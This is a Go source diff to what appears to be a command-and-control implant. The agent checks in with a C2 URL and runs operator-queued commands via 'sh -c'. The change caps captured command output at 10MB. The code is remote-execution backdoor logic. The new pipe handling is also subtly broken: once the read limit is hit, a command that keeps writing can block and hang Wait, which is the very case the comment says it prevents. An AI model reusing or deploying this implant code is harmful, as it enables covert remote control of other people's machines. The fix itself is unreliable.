@@ -6,6 +6,7 @@ import (
 	"crypto/tls"
 	"encoding/json"
 	"fmt"
+	"io"
 	"math/rand"
 	"net/http"
 	"os"
@@ -140,6 +141,10 @@ func checkin(client *http.Client, c2URL string, req *CheckinRequest) (*CheckinRe
 	return &cr, nil
 }
 
+// maxCommandOutput limits command output to 10MB to prevent OOM from
+// commands that produce unbounded output (e.g., `cat /dev/urandom`).
+const maxCommandOutput = 10 << 20
+
 func executeCommand(cmd QueuedCommand) *CommandResult {
 	full := cmd.Command
 	if cmd.Args != "" {
@@ -153,14 +158,28 @@ func executeCommand(cmd QueuedCommand) *CommandResult {
 		execCmd = exec.Command("sh", "-c", full)
 	}
 
-	output, err := execCmd.CombinedOutput()
-	exitCode := 0
+	// Use pipes instead of CombinedOutput to enforce a size limit
+	stdout, err := execCmd.StdoutPipe()
 	if err != nil {
+		return &CommandResult{CommandID: cmd.ID, Output: err.Error(), ExitCode: -1}
+	}
+	execCmd.Stderr = execCmd.Stdout // merge stderr into stdout pipe
+
+	if err := execCmd.Start(); err != nil {
+		return &CommandResult{CommandID: cmd.ID, Output: err.Error(), ExitCode: -1}
+	}
+
+	output, _ := io.ReadAll(io.LimitReader(stdout, maxCommandOutput))
+
+	exitCode := 0
+	if err := execCmd.Wait(); err != nil {
 		if exitErr, ok := err.(*exec.ExitError); ok {
 			exitCode = exitErr.ExitCode()
 		} else {
 			exitCode = -1
-			output = []byte(err.Error())
+			if len(output) == 0 {
+				output = []byte(err.Error())
+			}
 		}
 	}
 
